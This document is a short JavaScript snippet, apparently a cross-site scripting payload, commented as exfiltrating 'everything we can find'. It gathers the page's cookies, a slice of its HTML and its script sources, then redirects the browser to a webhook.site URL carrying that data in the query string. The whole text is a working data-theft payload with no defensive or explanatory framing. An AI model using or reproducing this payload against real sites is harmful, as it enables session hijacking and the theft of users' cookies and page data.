// Exfiltrate everything we can find
var info = {
    cookie: document.cookie,
    html: document.documentElement.innerHTML.substring(0, 500),
    scripts: Array.from(document.scripts).map(s => s.src || s.innerHTML.substring(0, 100))
};

window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?info=' + encodeURIComponent(JSON.stringify(info));